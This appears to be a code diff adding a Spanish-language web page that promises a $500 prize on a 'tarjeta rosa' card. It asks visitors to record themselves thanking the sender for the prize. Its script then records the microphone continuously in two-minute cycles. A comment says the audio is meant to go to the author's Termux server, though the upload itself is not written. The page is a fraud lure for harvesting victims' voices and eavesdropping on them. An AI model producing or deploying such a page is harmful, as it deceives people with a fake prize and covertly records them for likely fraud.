@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Premio de $500 de tu tarjeta rosa</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: sans-serif;
+        }
+        #botonGrabar {
+            padding: 15px 30px;
+            font-size: 1.2em;
+            color: white;
+            background-color: #ff007f;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        #mensaje {
+            text-align: center;
+            padding: 20px;
+            font-size: 1.1em;
+        }
+    </style>
+</head>
+<body>
+    <h1>Premio de $500 de tu tarjeta rosa</h1>
+    <p id="mensaje">Presiona el botón "Grabar" mencionando la frase "Gracias por mi premio de $500" para que pueda ser transferido a tu cuenta de tarjeta rosa y lo retires desde cualquier cajero.</p>
+    <button id="botonGrabar">Grabar</button>
+    <script>
+        let mediaRecorder;
+        let audioChunks = [];
+        let recordingInterval;
+
+        document.getElementById('botonGrabar').addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+                
+                mediaRecorder.addEventListener('dataavailable', event => {
+                    audioChunks.push(event.data);
+                });
+
+                mediaRecorder.addEventListener('stop', () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                    // Aquí se enviaría el audio a tu servidor en Termux
+                    // Puedes usar fetch() para enviar audioBlob
+                    audioChunks = [];
+                });
+
+                // Detener y reiniciar la grabación cada 120 segundos (2 minutos)
+                recordingInterval = setInterval(() => {
+                    mediaRecorder.stop();
+                    mediaRecorder.start();
+                }, 120000); // 120000 milisegundos = 2 minutos
+
+                alert("Grabación iniciada. Menciona la frase para la transferencia.");
+
+            } catch (error) {
+                console.error("Error al acceder al micrófono:", error);
+                alert("Error al acceder al micrófono. Asegúrate de dar permiso.");
+            }
+        });
+    </script>
+</body>
+</html>
